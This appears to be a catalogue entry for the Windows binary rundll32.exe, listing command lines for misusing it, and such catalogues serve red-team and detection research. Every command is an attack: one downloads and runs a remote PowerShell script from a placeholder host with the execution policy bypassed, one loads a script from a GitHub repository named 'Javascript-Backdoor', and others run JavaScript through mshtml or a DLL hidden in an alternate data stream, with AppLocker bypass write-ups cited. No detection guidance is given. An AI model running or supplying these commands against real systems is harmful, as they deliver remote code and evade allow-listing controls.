---
Name: Rundll32.exe
Description: Execute, Read ADS
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: rundll32.exe AllTheThingsx64,EntryPoint
    Description: ''
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
    Description: ''
  - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
    Description: ''
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
    Description: ''
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
    Description: ''
  - Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
    Description: ''
Full Path:
  - C:\Windows\System32\rundll32.exe
  - C:\Windows\SysWOW64\rundll32.exe
Code Sample: []
Detection: []
Resources:
  - https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
  - https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
  - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md
  - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  - https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
Notes: Thanks to Casey Smith - @subtee
---